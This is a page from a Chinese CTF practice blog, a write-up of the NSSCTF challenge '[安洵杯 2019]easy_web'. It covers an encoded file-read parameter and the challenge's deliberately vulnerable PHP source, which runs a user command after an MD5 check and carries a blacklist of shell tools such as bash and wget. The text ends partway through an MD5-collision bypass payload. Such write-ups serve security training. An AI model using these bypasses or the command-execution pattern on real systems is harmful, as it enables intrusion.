@@ -1,0 +1,478 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="UTF-8" />
+        <title>NSSCTF web 刷题记录3 | 雲流のLowest World</title>
+        <meta name="author" content="C1oudfL0w0" />
+        <meta name="description" content="" />
+        <meta name="keywords" content="" />
+        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+        <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+        <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入jQuery-->
+<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<!-- 引入不蒜子-->
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    
+        <script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+    <meta name="generator" content="Hexo 6.3.0"></head>
+    <body>
+        <!--flag{never_g0nna g1ve_you up}-->
+
+        <!-- 页面点击小红心与文字 -->
+        <script type = "text/javascript" src = "/blog/js/love-click.js"></script>
+
+        <!-- 浏览器标题 -->
+         <script type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+         
+        <!--动态背景-->
+        <script type="text/javascript"
+        color="0,0,255" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+        <!--文章目录-->
+        
+    <div id="toc" class="toc-article">
+    <h3><i class="fa-brands fa-readme"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web"><span class="toc-text">[安洵杯 2019]easy_web</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NCTF-2018-Easy-Audit"><span class="toc-text">[NCTF 2018]Easy_Audit</span></a></li></ol>
+    </div>
+  
+        
+        <!--返回顶部-->
+        <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+            <a title="返回顶部">↑</a>
+            </div>
+        <script src="/blog/js/totop.js"></script>
+
+        <div id="layout">
+            <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+            </transition>
+            <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>NSSCTF web 刷题记录3</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/11/21
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/Web/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Web
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/%E5%88%B7%E9%A2%98/" style="color: #00bcd4">刷题</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/NSS/" style="color: #ff7d73">NSS</a>
+            </span>
+            
+        </span>
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">1.1k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">5分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>刷题3rd，第13、14页</p>
+<span id="more"></span>
+
+<hr>
+<h1 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h1><blockquote>
+<p>任意文件读取+md5强比较+rce</p>
+</blockquote>
+<p>进入题目，一眼<code>/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</code>存在任意文件读取，读取的文件名好像存在编码，先解码看看</p>
+<p><img src="/blog/2023/11/21/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/image-20231121123650395.png" alt="image-20231121123650395"></p>
+<p>可以知道套了一层hex，两层base64，那我们用同样的方式编码index.php，然后读取index.php</p>
+<p><img src="/blog/2023/11/21/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/image-20231121123929025.png" alt="image-20231121123929025"></p>
+<p>打开读取的图像，base64解码一下内容</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token class-name">E_ALL</span> <span class="token operator">||</span> <span class="token operator">~</span> <span class="token constant">E_NOTICE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
+    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[^a-zA-Z0-9.]+/"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src ="./ctf3.jpeg">'</span><span class="token punctuation">;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"xixi～ no flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;img src='data:image/gif;base64,"</span> <span class="token operator">.</span> <span class="token variable">$txt</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"'>&lt;/img>"</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">echo</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|>/i"</span><span class="token punctuation">,</span> <span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"forbid ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`$cmd`</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"md5 is funny ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token delimiter important">?></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
+  <span class="token selector">body</span><span class="token punctuation">&#123;</span>
+   <span class="token property">background</span><span class="token punctuation">:</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>./bj.png<span class="token punctuation">)</span></span>  no-repeat center center<span class="token punctuation">;</span>
+   <span class="token property">background-size</span><span class="token punctuation">:</span>cover<span class="token punctuation">;</span>
+   <span class="token property">background-attachment</span><span class="token punctuation">:</span>fixed<span class="token punctuation">;</span>
+   <span class="token property">background-color</span><span class="token punctuation">:</span>#CCCCCC<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>审计代码，可以知道这里不让我们直接读flag，然后要满足md5强比较才能执行命令，而且命令执行的cmd参数部分过滤了大量的命令</p>
+<p>md5强比较这里不能用数组，直接掏出传家宝（</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">a<span class="token operator">=</span>psycho<span class="token operator">%</span><span class="token number">0</span>A<span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span>W<span class="token operator">%</span><span class="token constant">ADZ</span><span class="token operator">%</span><span class="token constant">AF</span><span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">8</span>A<span class="token operator">%</span><span class="token number">13</span>V<span class="token operator">%</span><span class="token constant">B5</span><span class="token operator">%</span><span class="token number">96</span><span class="token operator">%</span><span class="token number">18</span>m<span class="token operator">%</span><span class="token constant">A5</span><span class="token operator">%</span><span class="token constant">EA2</span><span class="token operator">%</span><span class="token number">81</span>_<span class="token operator">%</span><span class="token constant">FB</span><span class="token operator">%</span><span class="token constant">D9</span><span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">8</span>F<span class="token operator">%</span><span class="token constant">D4D</span><span class="token operator">%</span>A27vX<span class="token operator">%</span><span class="token constant">B8</span><span class="token operator">%</span><span class="token number">08</span><span class="token operator">%</span>D7m<span class="token operator">%</span><span class="token number">2</span>C<span class="token operator">%</span><span class="token constant">E0</span><span class="token operator">%</span><span class="token constant">D4LR</span><span class="token operator">%</span><span class="token constant">D7</span><span class="token operator">%</span>FBo<span class="token operator">%</span><span class="token number">10</span>t<span class="token operator">%</span><span class="token number">19</span><span class="token operator">%</span><span class="token number">02</span><span class="token operator">%</span><span class="token number">82</span><span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">9</span>Bt<span class="token operator">%</span><span class="token number">05</span><span class="token operator">%</span>FFl<span class="token operator">%</span><span class="token constant">AE</span><span class="token operator">%</span><span class="token number">8</span>DE<span class="token operator">%</span><span class="token constant">F4</span><span class="token operator">%</span><span class="token number">1</span>F<span class="token operator">%</span><span class="token number">84</span><span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token constant">AE</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">0</span>F<span class="token operator">%</span><span class="token number">9</span>B<span class="token operator">%</span><span class="token number">12</span><span class="token operator">%</span><span class="token constant">D4</span><span class="token operator">%</span><span class="token number">81</span><span class="token operator">%</span><span class="token constant">A5J</span><span class="token operator">%</span><span class="token constant">F9H</span><span class="token operator">%</span><span class="token number">0</span>FyE<span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token constant">DC</span><span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token constant">B1</span><span class="token operator">%</span><span class="token constant">B4</span><span class="token operator">%</span><span class="token number">0</span>F<span class="token operator">%</span>DEcC<span class="token operator">%</span><span class="token number">40</span><span class="token operator">%</span><span class="token constant">DA29</span><span class="token operator">%</span><span class="token number">8</span>B<span class="token operator">%</span><span class="token constant">C3</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">7</span>F<span class="token operator">%</span><span class="token number">8</span>B_h<span class="token operator">%</span><span class="token constant">C6</span><span class="token operator">%</span><span class="token constant">D3</span><span class="token operator">%</span><span class="token number">8</span>Bd8<span class="token operator">%</span><span class="token constant">AF</span><span class="token operator">%</span><span class="token number">85</span><span class="token operator">%</span><span class="token number">7</span>C<span class="token operator">%</span><span class="token number">14</span>w<span class="token operator">%</span><span class="token number">06</span><span class="token operator">%</span><span class="token constant">C2</span><span class="token operator">%</span><span class="token number">3</span>AC<span class="token operator">%</span><span class="token constant">BC</span><span class="token operator">%</span><span class="token number">0</span>C<span class="token operator">%</span><span class="token number">1</span>B<span class="token operator">%</span><span class="token constant">FD</span><span class="token operator">%</span><span class="token constant">BB</span><span class="token operator">%</span><span class="token number">98</span><span class="token operator">%</span><span class="token constant">CE</span><span class="token operator">%</span><span class="token number">16</span><span class="token operator">%</span><span class="token constant">CE</span><span class="token operator">%</span><span class="token constant">B7</span><span class="token operator">%</span><span class="token constant">B6</span><span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token constant">F3</span><span class="token operator">%</span><span class="token number">99</span><span class="token operator">%</span><span class="token constant">B59</span><span class="token operator">%</span><span class="token constant">F9</span><span class="token operator">%</span><span class="token constant">FF</span><span class="token operator">%</span><span class="token constant">C2</span><span class="token operator">&amp;</span>b<span class="token operator">=</span>psycho<span class="token operator">%</span><span class="token number">0</span>A<span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span>W<span class="token operator">%</span><span class="token constant">ADZ</span><span class="token operator">%</span><span class="token constant">AF</span><span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">8</span>A<span class="token operator">%</span><span class="token number">13</span>V<span class="token operator">%</span><span class="token constant">B5</span><span class="token operator">%</span><span class="token number">96</span><span class="token operator">%</span><span class="token number">18</span>m<span class="token operator">%</span><span class="token constant">A5</span><span class="token operator">%</span><span class="token constant">EA2</span><span class="token operator">%</span><span class="token number">81</span>_<span class="token operator">%</span><span class="token constant">FB</span><span class="token operator">%</span><span class="token constant">D9</span><span class="token operator">%</span><span class="token constant">A4</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">8</span>F<span class="token operator">%</span><span class="token constant">D4D</span><span class="token operator">%</span>A27vX<span class="token operator">%</span><span class="token constant">B8</span><span class="token operator">%</span><span class="token number">08</span><span class="token operator">%</span>D7m<span class="token operator">%</span><span class="token number">2</span>C<span class="token operator">%</span><span class="token constant">E0</span><span class="token operator">%</span><span class="token constant">D4LR</span><span class="token operator">%</span><span class="token constant">D7</span><span class="token operator">%</span>FBo<span class="token operator">%</span><span class="token number">10</span>t<span class="token operator">%</span><span class="token number">19</span><span class="token operator">%</span><span class="token number">02</span><span class="token operator">%</span><span class="token number">02</span><span class="token operator">%</span><span class="token number">7</span>E<span class="token operator">%</span><span class="token number">7</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">9</span>Bt<span class="token operator">%</span><span class="token number">05</span><span class="token operator">%</span>FFl<span class="token operator">%</span><span class="token constant">AE</span><span class="token operator">%</span><span class="token number">8</span>DE<span class="token operator">%</span><span class="token constant">F4</span><span class="token operator">%</span><span class="token number">1</span>F<span class="token operator">%</span><span class="token number">04</span><span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token constant">AE</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">0</span>F<span class="token operator">%</span><span class="token number">9</span>B<span class="token operator">%</span><span class="token number">12</span><span class="token operator">%</span><span class="token constant">D4</span><span class="token operator">%</span><span class="token number">81</span><span class="token operator">%</span><span class="token constant">A5J</span><span class="token operator">%</span><span class="token constant">F9H</span><span class="token 